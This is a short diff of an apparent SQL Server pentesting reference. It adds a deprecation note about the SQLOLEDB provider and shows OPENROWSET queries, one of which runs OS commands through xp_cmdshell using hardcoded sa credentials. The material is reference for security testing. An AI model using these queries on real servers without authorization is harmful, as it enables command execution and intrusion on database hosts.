@@ -65,8 +65,12 @@ SELECT * FROM OPENROWSET(
     'Server=remote-server;uid=sa;pwd=password;',
     'SELECT * FROM master.sys.server_principals'
 )
+```
 
--- Using SQLOLEDB provider with command execution
+**Note:** SQLOLEDB is deprecated; prefer SQLNCLI or MSOLEDBSQL. SQLOLEDB may not be available in SQL Server 2019+.
+
+```sql
+-- Using SQLOLEDB provider with command execution (legacy, may not work on newer versions)
 SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');
 ```
 
